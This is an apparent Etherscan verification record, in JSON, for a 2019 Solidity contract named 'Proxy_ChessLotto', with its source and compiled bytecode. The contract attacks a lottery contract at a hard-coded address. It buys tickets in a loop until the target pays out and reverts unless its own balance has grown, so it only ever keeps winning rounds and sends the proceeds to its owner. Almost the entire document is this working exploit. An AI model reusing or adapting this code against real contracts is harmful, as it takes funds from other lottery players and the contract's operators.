{
  "address": "0x8a703fcd94fb01815f38bba74807e17852d32547",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "Proxy_ChessLotto",
  "compilerVersion": "v0.5.2+commit.1df8f40c",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-01-08\n*/\n\npragma solidity ^0.5.0;\n\ncontract TargetInterface {\n    function AddTicket() public payable;\n}\n\ncontract Proxy_ChessLotto {\n    \n    address targetAddress = 0x309dFE127881922C356Fe8F571846150768C551e;\n    uint256 betSize = 0.00064 ether;\n\n    address payable private owner;\n    \n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    constructor() public payable {\n        owner = msg.sender;\n    }\n    \n    function ping(bool _keepBalance) public payable onlyOwner {\n        uint256 targetBalanceInitial = address(targetAddress).balance;\n        uint256 existingBetsInitial = targetBalanceInitial / betSize;\n        require(existingBetsInitial > 0);\n        \n        uint256 ourBalanceInitial = address(this).balance;\n        \n        TargetInterface target = TargetInterface(targetAddress);\n    \n        uint256 ourBetCount = 64 - existingBetsInitial;\n\n        for (uint256 ourBetIndex = 0; ourBetIndex < ourBetCount; ourBetIndex++) {\n            target.AddTicket.value(betSize)();\n            \n            if (address(targetAddress).balance < targetBalanceInitial) {\n                break;\n            }\n        }\n        \n        require(address(this).balance > ourBalanceInitial);\n        \n        if (!_keepBalance) {\n            owner.transfer(address(this).balance);\n        }\n    }\n\n    function withdraw() public onlyOwner {\n        owner.transfer(address(this).balance);\n    }    \n    \n    function kill() public onlyOwner {\n        selfdestruct(owner);\n    }    \n    \n    function () external payable {\n    }\n    \n}",
  "bytecode": "608060405260008054600160a060020a031990811673309dfe127881922c356fe8f571846150768c551e17909155660246139ca800006001556002805490911633179055610296806100526000396000f3fe608060405260043610610050577c0100000000000000000000000000000000000000000000000000000000600035046307ca3bc181146100525780633ccfd60b1461007157806341c0e1b514610086575b005b6100506004803603602081101561006857600080fd5b5035151561009b565b34801561007d57600080fd5b506100506101f1565b34801561009257600080fd5b50610050610245565b600254600160a060020a031633146100b257600080fd5b60008054600154600160a060020a03909116319190828115156100d157fe5b049050600081116100e157600080fd5b60008054303191600160a060020a03909116906040849003905b818110156101985782600160a060020a031663b204bb5d6001546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561015c57600080fd5b505af1158015610170573d6000803e3d6000fd5b5050600054600160a060020a031631891115925061019091505057610198565b6001016100fb565b50303183106101a657600080fd5b8515156101e957600254604051600160a060020a0390911690303180156108fc02916000818181858888f193505050501580156101e7573d6000803e3d6000fd5b505b505050505050565b600254600160a060020a0316331461020857600080fd5b600254604051600160a060020a0390911690303180156108fc02916000818181858888f19350505050158015610242573d6000803e3d6000fd5b50565b600254600160a060020a0316331461025c57600080fd5b600254600160a060020a0316fffea165627a7a723058202eb7b682cfc83b2dc34cf48372a4fe366749332d5633a52fcaa584f516abf0e40029"
}